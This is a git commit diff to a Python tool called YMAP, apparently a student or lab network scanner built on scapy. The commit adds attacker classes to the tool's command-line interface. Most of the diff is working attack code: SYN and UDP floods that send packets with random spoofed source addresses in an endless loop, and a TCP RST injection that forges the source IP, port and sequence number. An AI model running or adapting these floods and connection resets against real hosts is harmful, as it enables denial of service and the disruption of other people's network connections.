98e4c2683d093c41a6724b8948a111003e419c2e
yuyouyu <624297803@qq.com>
2022-02-25 13:40:10 +0800

    add: add Attacker

--- Attacker.py
+++ Attacker.py
@@ -1,6 +1,11 @@
 from scapy.all import *
 from ipaddress import IPv4Address
 from random import getrandbits
+from Scanner import print_banner
+
+
+__all__ = ["SYNFlood", "TraceRoute", "RSTAttack", "UDPFlood"]
+
 
 class _Attacker:
     """
@@ -9,9 +14,9 @@ class _Attacker:
     __attacker__ = "Base Attacker"
 
     def __init__(self, target, port):
+        print_banner()
         self._target = target
         self._port = port
-
 
     def set_target(self, new_target, new_port):
         self._target = new_target
@@ -19,23 +24,88 @@ class _Attacker:
 
     def attack(self):
         raise NotImplementedError()
-        
 
 
 class SYNFlood(_Attacker):
-    """
-    SYN Flooding Attacker.
+    """_summary_
+
+    Args:
+        _Attacker (_type_): SYN Flooding Attacker.
     """
     __attacker__ = "SYN Flooding Attacker"
-    
+
     def attack(self):
-        ip  = IP(dst=self._target)
+        print("%s for %s:%s" % (self.__attacker__, self._target, self._port))
+        ip = IP(dst=self._target)
         tcp = TCP(dport=self._port, flags='S')
         pkt = ip/tcp
 
         while True:
-            pkt[IP].src    = str(IPv4Address(getrandbits(32)))  # source iP
+            pkt[IP].src = str(IPv4Address(getrandbits(32)))  # source iP
             pkt[TCP].sport = getrandbits(16)     # source port
-            pkt[TCP].seq   = getrandbits(32)     # sequence number
-            send(pkt, verbose = 0)
+            pkt[TCP].seq = getrandbits(32)     # sequence number
+            print(pkt.summary())
+            send(pkt, verbose=0)
 
+
+class UDPFlood(_Attacker):
+    """_summary_
+
+    Args:
+        _Attacker (_type_): UDP Flooding Attacker.
+    """
+    __attacker__ = "UDP Flooding Attacker"
+
+    def attack(self):
+        print("%s for %s:%s" % (self.__attacker__, self._target, self._port))
+        ip = IP(dst=self._target)
+        udp = UDP(dport=self._port)
+        payload = 'UDP Flooding' * 100
+        pkt = ip/udp/payload
+
+        while True:
+            pkt[IP].src = str(IPv4Address(getrandbits(32)))  # source iP
+            pkt[UDP].sport = getrandbits(16)     # source port
+            print(pkt.summary())
+            send(pkt, verbose=0)
+
+
+class TraceRoute(_Attacker):
+    """_summary_
+
+    Args:
+        _Attacker (_type_): Trace Route Attacker
+    """
+    __attacker__ = "Trace Route Attacker"
+
+    def attack(self):
+        print("%s for %s:%s" % (self.__attacker__, self._target, self._port))
+        pkts = IP(dst=self._target, ttl=(1, 16)) / TCP(dport=self._port)
+        for pkt in pkts:
+            resp = sr1(pkt, timeout=1)
+            if resp is None:
+                print('.')
+                continue
+            print('-'*100)
+            print(resp.summary())
+            print('-'*100)
+            # 18 = SA = 0x12
+            if resp.haslayer(TCP) and resp[TCP].flags == 0x12:
+                break
+
+
+class RSTAttack(_Attacker):
+    """_summary_
+
+    Args:
+        _Attacker (_type_): TCP RST Attack
+    """
+    __attacker__ = "TCP RST Attack"
+
+    def attack(self, source_ip, source_port, sequence):
+        print("%s for %s:%s" % (self.__attacker__, self._target, self._port))
+        ip = IP(src=source_ip, dst=self._target)
+        tcp = TCP(sport=source_port, dport=self._port, flags="R", seq=sequence)
+        pkt = ip/tcp
+        print(pkt.summary())
+        send(pkt, verbose=0)
--- YMAP.py
+++ YMAP.py
@@ -1,11 +1,14 @@
 import click
 from Scanner import *
 from Attacker import *
+from prettytable import PrettyTable
 
 SCAN_METHOD = {'tcp': TCPConnScan, 'syn': TCPSynScan, 'xmas': TCPXmasScan, 'fin': TCPFinScan,
                'null': TCPNullScan, 'ack': TCPAckScan, 'win': TCPWindowScan, 'udp': UDPScan}
 
-ATTACK_METHOD = {'synflood': SYNFlood}
+ATTACK_METHOD = {'synflood': SYNFlood, 'traceroute': TraceRoute, 'rstattack': RSTAttack,
+                 'udpflood': UDPFlood}
+
 
 @click.command()
 @click.option('--scan/--no-scan', '-S', default=False, help='Scanner')
@@ -14,29 +17,37 @@ ATTACK_METHOD = {'synflood': SYNFlood}
 @click.option('--sport', '-s', default=8880, type=int, help='The starting port of the port scanner.')
 @click.option('--eport', '-e', default=8890, type=int, help='The ending port of the port scanner.')
 @click.option('--timeout', '-t', default=2, type=int, help='Set the timeout.')
-@click.option('--method', '-m', default='syn', type=str, help='Port scanning or network attack methods.')
-@click.option('--prot', '-p', default=8080, type=int, help='Attack aim port.')
-def ymap(scan, attack, ip, sport, eport, method, timeout, port):
-    if scan and attack:
+@click.option('--method', '-m', default='syn', type=str, help=f'Port scanning or network attack methods. Scanner methods {tuple(SCAN_METHOD.keys())}; Attacker methods {tuple(ATTACK_METHOD.keys())}.')
+@click.option('--port', '-p', default=8080, type=int, help='Attack aim port.')
+@click.option('--sourceport', '-sp', default=8080, type=int, help='Attack source port.')
+@click.option('--sourceip', '-si', default='172.16.0.90', type=str, help='Source IP of the port scanner or attack program.')
+@click.option('--sequence', '-seq', default=4065682361, type=int, help='Attack pakage sequence.')
+def ymap(scan, attack, ip, sport, eport, method, timeout, port, sourceport, sourceip, sequence):
+    if (scan and attack):
         click.secho(
             'ERROR: Please Choose One Mode!(-S for Scan, -A for Attack)!', fg='red', bold=True)
         return
     elif scan:
         if method not in SCAN_METHOD.keys():
             click.secho(
-                'ERROR: Please enter a legal scan method!(tcp, syn, xmas, fin, null, ack, win, udp)!', fg='red', bold=True)
+                f'ERROR: Please enter a legal scan method! {tuple(SCAN_METHOD.keys())}!', fg='red', bold=True)
             return
         else:
             scan_method = SCAN_METHOD[method](target=ip, timeout=timeout)
             scan_method.scan(range(sport, eport + 1))
-    else:
-        if method not in Attack_METHOD.keys():
+    elif attack:
+        if method not in ATTACK_METHOD.keys():
             click.secho(
-                'ERROR: Please enter a legal scan method(synflood)!', fg='red', bold=True)
+                f'ERROR: Please enter a legal scan method {tuple(ATTACK_METHOD.keys())}!', fg='red', bold=True)
             return
         else:
             att_method = ATTACK_METHOD[method](target=ip, port=port)
-            att_method.attack()
+            if isinstance(att_method, RSTAttack):
+                att_method.attack(source_ip=sourceip,
+                                  source_port=sourceport, sequence=sequence)
+            else:
+                att_method.attack()
+        
 
 
 if __name__ == '__main__':
